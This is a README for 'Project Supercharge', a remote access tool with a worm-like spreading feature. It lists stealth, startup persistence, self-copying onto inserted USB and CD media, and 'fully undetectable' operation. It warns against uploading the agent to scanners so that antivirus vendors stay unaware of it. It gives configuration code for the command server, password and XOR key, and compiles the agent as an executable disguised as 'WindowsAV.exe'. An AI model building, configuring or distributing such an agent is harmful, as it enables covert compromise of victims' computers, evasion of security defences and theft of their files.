## Project Supercharge


### NOTE
Do not by any means upload the Agent to online Scanners. Why? Because even if one of the engines finds the file suspicious, the service shares the result among all AV companies, allowing cyber-security firms insight on new types of malware that their engines are not currently detecting. [Read here](https://www.bleepingcomputer.com/news/security/75-percent-of-malware-uploaded-on-no-distribute-scanners-is-unknown-to-researchers/).

![scan_nodistribute](https://github.com/quantumcore/supercharge/blob/master/img/scan.png)

---

Project supercharge is a Remote Access Agent. The supercharge agent is mainly created to provide remote access to a Computer with Stealth and Persistence. 

---

- [Features](#project-supercharge-features)
- [Installing](#Installing)
- [Deployment](#Deployment)
- [Bugs](#Bugs)
- [Contributing](#Contribute)
- [Thank you](#thank-you)
- [Contact](#Contact)
- [Screenshot](#Screenshot)
---

### Project Supercharge Features
Feature | Detail
---|---
System Information | View System Information.
Persistence | Automatically add itself to Startup when first run.
Stealth | Automatically hide itself to a Location when first run.
Spreading | If supercharge agent is running and a USB/CD is inserted, The agent will copy itself over into it.
Message Box | Display a message box.
Encrypted Connection | Your communication is encrypted with a key of your choice.
Password Protection | Even though it's encrypted, It will authenticate with a Password hardcoded in the Agent.
Offline Bot Database | supercharge comes with an Offline Web App you can use to easily view all Agents that ever Connected and when.
Fully Undetectable | The Agent is fully undetectable. 
File Upload/Download | Download and upload files.
Explore | Move around and view files.


---

### Installing

##### Prerequisites
*(NOTE : These are installed by setup script)*

- Mingw cross Compiler
- Python 3

```bash
$ git clone https://github.com/quantumcore/supercharge
$ cd supercharge
$ sudo ./install.sh
```

### Note : It can run on Windows, But I recommened a Linux Based OS. (Server side)


---

### Deployment
1. Go to supercharge/agent and open file ``supercharge.hpp`` EG:
```bash
nano supercharge.hpp
```
2. Edit the Line `SERVER_HOST` and `SERVER_PORT` and the `PASSWORD`. EG:
```bash
#define PASSWORD "mysecretpassword" 
#define SERVER_HOST "127.0.0.1"
#define SERVER_PORT 3982 
```
**Make sure the password is the same you define in ``supercharge.ini``. (Server side)**

3. Go to supercharge/agent and openfile ``xor.cpp`` EG:
```bash
nano xor.cpp
```

4 Edit line (4) which contains the Encryption key. For Example.
```cpp
std::string XOR(std::string data) {
    // Encryption KEY BELOW
    char key[] = {'M','Y','K','E','Y'};
    // DONT FORGET TO SET !
    std::string output = data;
    
    for (int i = 0; i < data.size(); i++){
        output[i] = data[i] ^ key[i % (sizeof(key) / sizeof(char))];
    }
    return output;
}
```
5. Compile the Agent
**On Windows**
```bash
make
```
**On Linux**
```bash
make linux
```

This will generate the Supercharge agent named ``WindowsAV.exe`` with an ICON.


#### Server Side Settings
1. Setting the Encryption key.
Open file ``kernel/infodb.py`` in your text editor and edit line 31 to your encryption key. It can be anything.
For Example. 
```bash
$ cd supercharge
$ nano kernel/infodb.py
```

```python
def xor(data):
    # Encryption KEY! EDIT ME !
    key = ['M','Y','K','E','Y']
    # Encryption key ABOVE!
    output = []
    for i in range(len(data)):
        xor_num = ord(data[i]) ^ ord(key[i % len(key)])
        output.append(chr(xor_num))
    return ''.join(output)
```

2. Setting the Password.
Open file ``supercharge.ini`` and you can just simply change the values.

### Bugs 
**Fixed**
- Broken Connection Problems. :heavy_check_mark:
- Password Authentication buffer overflow. :heavy_check_mark:
- Remove wchar_t functions (Old code) :heavy_check_mark:
- File Execution bug. :heavy_check_mark:
- File Download byte bug. :heavy_check_mark:
- Windows 10 detected as Windows 8. (Thanks to [@dannyvsdev](https://github.com/dennyvsdev)) :heavy_check_mark:
- WAN IP Bug.

### Contribute
If you would like to help me! Please do so! Also, I do not use branches because I always end up pushing to master. So, I always create another repositroy (private) for developement. So if you would like to help me, [Contact](#Contact) me.

### Thank you for bug reporting
- [dannyvsdev](https://github.com/dennyvsdev)
- [underg33k](https://github.com/underg33k)

#### TODO :
- File sorting in the remote file listing. :heavy_check_mark:
- Imrpovement of the file upload function. :heavy_check_mark:
- Console Updates. :heavy_check_mark:

### Contact 
- [Discord](https://discordapp.com/invite/8snh7nx)
- [Website](https://quantumcore.github.io)

#### Screenshot
![sample](https://github.com/quantumcore/supercharge/blob/master/img/sample.png)
